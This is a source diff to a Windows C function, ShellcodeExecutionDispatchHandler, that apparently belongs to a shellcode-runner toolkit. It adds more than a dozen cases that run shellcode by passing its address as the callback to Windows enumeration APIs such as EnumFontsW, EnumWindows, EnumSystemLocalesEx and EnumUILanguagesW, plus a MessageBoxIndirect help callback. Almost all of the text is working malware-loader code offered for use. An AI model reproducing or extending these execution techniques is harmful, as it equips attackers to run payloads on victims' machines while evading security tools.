@@ -146,19 +146,121 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 		case E_ENUMFONTFAMILIESEXW:
 		{
 			LOGFONTW Font = { 0 };
-			HDC Dc = NULL;
-
 			Font.lfCharSet = DEFAULT_CHARSET;
-			Dc = GetDC(NULL);
-			if (Dc == NULL)
-				goto EXIT_ROUTINE;
 
-			if (!EnumFontFamiliesExW(Dc, &Font, (FONTENUMPROCW)BinAddress, NULL, NULL))
+			if (!EnumFontFamiliesExW(GetDC(NULL), &Font, (FONTENUMPROCW)BinAddress, NULL, NULL))
 				goto EXIT_ROUTINE;
 
 			break;
 		}
-		
+
+		case E_ENUMFONTSW:
+		{
+			EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)BinAddress, NULL);
+			break;
+		}
+
+		case E_ENUMICMPROFILESW:
+		{
+			goto EXIT_ROUTINE;
+		}
+
+		case E_ENUMLANGUAGEGROUPLOCALESW:
+		{
+			EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)BinAddress, LGRPID_ARABIC, 0, 0);
+			break;
+		}
+
+		case E_ENUMOBJECTS:
+		{
+			LOGFONTW Font = { 0 };
+			Font.lfCharSet = DEFAULT_CHARSET;
+
+			EnumObjects(GetDC(NULL), OBJ_BRUSH, (GOBJENUMPROC)BinAddress, NULL);
+			break;
+		}
+
+		case E_ENUMPROPSEXW:
+		{
+			goto EXIT_ROUTINE;
+		}
+
+		case E_ENUMRESOURCETYPESEXW:
+		{
+			EnumResourceTypesExW(NULL, (ENUMRESTYPEPROCW)BinAddress, NULL, RESOURCE_ENUM_VALIDATE, NULL);
+			break;
+		}
+
+		case E_ENUMSYSTEMCODEPAGES:
+		{
+			EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)BinAddress, CP_INSTALLED);
+			break;
+		}
+
+		case E_ENUMSYSTEMGEOID:
+		{
+			EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)BinAddress);
+			break;
+		}
+
+		case E_ENUMSYSTEMLANGUAGEGROUPS:
+		{
+			EnumSystemLanguageGroupsW((LANGUAGEGROUP_ENUMPROCW)BinAddress, LGRPID_SUPPORTED, NULL);
+			break;
+		}
+
+		case E_ENUMSYSTEMLOCALESEX:
+		{
+			EnumSystemLocalesEx((LOCALE_ENUMPROCEX)BinAddress, LOCALE_ALL, NULL, NULL);
+			break;
+		}
+
+		case E_ENUMTHREADWINDOWS:
+		{
+			EnumThreadWindows(0, (WNDENUMPROC)BinAddress, NULL);
+			break;
+		}
+
+		case E_ENUMTIMEFORMATSEX:
+		{
+			EnumTimeFormatsEx((TIMEFMT_ENUMPROCEX)BinAddress, LOCALE_NAME_SYSTEM_DEFAULT, TIME_NOSECONDS, NULL);
+			break;
+		}
+
+		case E_ENUMUILANGUAGESW:
+		{
+			EnumUILanguagesW((UILANGUAGE_ENUMPROCW)BinAddress, MUI_LANGUAGE_ID, NULL);
+			break;
+		}
+
+		case E_ENUMWINDOWSTATIONSW:
+		{
+			EnumWindowStationsW((WINSTAENUMPROCW)BinAddress, NULL);
+			break;
+		}
+
+		case E_ENUMWINDOWS:
+		{
+			EnumWindows((WNDENUMPROC)BinAddress, NULL);
+			break;
+		}
+
+		case E_ENUMPROPSW:
+		{
+			goto EXIT_ROUTINE;
+		}
+
+		case E_MESSAGEBOXINDIRECT:
+		{
+			MSGBOXPARAMS MessageBoxParams = { 0 };
+			MessageBoxParams.cbSize = sizeof(MSGBOXPARAMS);
+			MessageBoxParams.dwStyle = MB_HELP;
+			MessageBoxParams.lpfnMsgBoxCallback = (MSGBOXCALLBACK)BinAddress;
+			MessageBoxParams.lpszText = L"[Unstable] Help Executes Shellcode";
+
+			MessageBoxIndirect(&MessageBoxParams);
+		}
+
 		default:
 			goto EXIT_ROUTINE;
 
